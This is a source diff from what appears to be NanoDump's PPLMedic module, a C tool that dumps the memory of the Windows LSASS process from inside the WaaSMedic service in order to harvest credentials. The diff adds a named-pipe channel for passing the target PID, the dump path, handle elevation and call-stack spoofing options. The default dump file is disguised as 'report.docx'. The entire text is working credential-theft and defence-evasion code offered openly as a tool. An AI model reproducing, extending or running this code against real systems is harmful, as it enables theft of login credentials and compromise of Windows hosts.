@@ -1299,24 +1299,83 @@ void APIENTRY EADeleteAggregateEvent(VOID) {}
 
 #include "ppl/ppl_medic.h"
 #include "ppl/ppl_medic_dll.h"
+#include "pipe.h"
 
 BOOL NanoDumpPPLMedic(VOID)
 {
-    /******************* change this *******************/
-    LPCSTR dump_path        = "C:\\Windows\\Temp\\report.docx";
-    BOOL   use_valid_sig    = FALSE;
-    BOOL   duplicate_handle = FALSE;
-    /***************************************************/
+#if !defined(PASS_PARAMS_VIA_NAMED_PIPES) || (PASS_PARAMS_VIA_NAMED_PIPES == 0)
 
+    /*
+     * if you compile with -DPASS_PARAMS_VIA_NAMED_PIPES=0, then these are the parameters
+     * that the nanodump DLL will use, change them to your liking
+     */
+    /******************* change this *******************/
+    LPSTR          dump_path            = "C:\\Windows\\Temp\\report.docx";
+    BOOL           use_valid_sig        = FALSE;
+    BOOL           duplicate_handle     = FALSE;
+    DWORD          lsass_pid            = 0;
+    BOOL           elevate_handle       = FALSE;
+    BOOL           duplicate_elevate    = FALSE;
+    DWORD          spoof_callstack      = 0;
+    /***************************************************/
     dump_context   dc                   = { 0 };
     BOOL           ret_val              = FALSE;
+    BOOL           success              = FALSE;
     HANDLE         hProcess             = NULL;
-    DWORD          lsass_pid            = 0;
-    BOOL           success              = TRUE;
     SIZE_T         region_size          = 0;
     PVOID          base_address         = NULL;
     WCHAR          wcFilePath[MAX_PATH] = { 0 };
     UNICODE_STRING full_dump_path       = { 0 };
+
+    signal_dll_load_event(STR_IPC_WAASMEDIC_LOAD_EVENT_NAME);
+
+#else
+    HANDLE         hPipe                = NULL;
+    LPSTR          dump_path            = NULL;
+    BOOL           use_valid_sig        = FALSE;
+    BOOL           duplicate_handle     = FALSE;
+    DWORD          lsass_pid            = 0;
+    BOOL           elevate_handle       = FALSE;
+    BOOL           duplicate_elevate    = FALSE;
+    DWORD          spoof_callstack      = 0;
+    dump_context   dc                   = { 0 };
+    BOOL           ret_val              = FALSE;
+    BOOL           success              = FALSE;
+    HANDLE         hProcess             = NULL;
+    SIZE_T         region_size          = 0;
+    PVOID          base_address         = NULL;
+    WCHAR          wcFilePath[MAX_PATH] = { 0 };
+    UNICODE_STRING full_dump_path       = { 0 };
+
+    success = create_named_pipe(
+        IPC_PIPE_NAME,
+        FALSE,
+        &hPipe);
+    if (!success)
+        goto cleanup;
+
+    success = signal_dll_load_event(STR_IPC_WAASMEDIC_LOAD_EVENT_NAME);
+    if (!success)
+        goto cleanup;
+
+    success = listen_on_named_pipe(
+        hPipe);
+    if (!success)
+        goto cleanup;
+
+    success = recv_arguments_from_pipe(
+        hPipe,
+        &lsass_pid,
+        &dump_path,
+        &use_valid_sig,
+        &duplicate_handle,
+        &elevate_handle,
+        &duplicate_elevate,
+        &spoof_callstack);
+    if (!success)
+        goto cleanup;
+
+#endif
 
     full_dump_path.Buffer        = wcFilePath;
     full_dump_path.Length        = 0;
@@ -1335,8 +1394,6 @@ BOOL NanoDumpPPLMedic(VOID)
 #endif
 
     //remove_syscall_callback_hook();
-
-    signal_dll_load_event(STR_IPC_WAASMEDIC_LOAD_EVENT_NAME);
 
     if (!full_dump_path.Length)
         goto cleanup;
@@ -1365,10 +1422,10 @@ BOOL NanoDumpPPLMedic(VOID)
         &hProcess,
         lsass_pid,
         duplicate_handle,
+        elevate_handle,
+        duplicate_elevate,
         FALSE,
-        FALSE,
-        FALSE,
-        FALSE,
+        spoof_callstack,
         FALSE,
         NULL,
         NULL,
@@ -1444,6 +1501,14 @@ cleanup:
         NtClose(hProcess);
     if (!ret_val)
         delete_file(dump_path);
+#if defined(PASS_PARAMS_VIA_NAMED_PIPES) && (PASS_PARAMS_VIA_NAMED_PIPES == 1)
+    if (dump_path)
+        intFree(dump_path);
+    if (hPipe)
+        disconnect_pipe(hPipe);
+    if (hPipe)
+        NtClose(hPipe);
+#endif
 
     return ret_val;
 }
